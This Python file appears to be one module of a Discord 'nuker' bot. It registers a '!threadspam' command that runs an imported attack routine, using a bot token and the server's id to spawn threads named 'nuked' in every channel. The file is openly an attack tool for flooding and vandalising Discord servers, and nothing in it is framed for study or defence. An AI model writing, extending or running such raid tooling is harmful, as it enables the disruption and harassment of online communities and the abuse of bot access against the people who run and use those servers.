"""!threadspam - spawn threads in every channel."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class ThreadSpam(commands.Cog):
    """spawn threads in every channel."""

    @commands.command(name="threadspam")
    async def threadspam(self, ctx: commands.Context):
        """spawn threads in every channel."""
        await run_attack(
            ctx, "Thread Spam",
            lambda g: attacks.thread_spam(token(), g.id, "nuked"))


async def setup(bot: commands.Bot):
    await bot.add_cog(ThreadSpam())
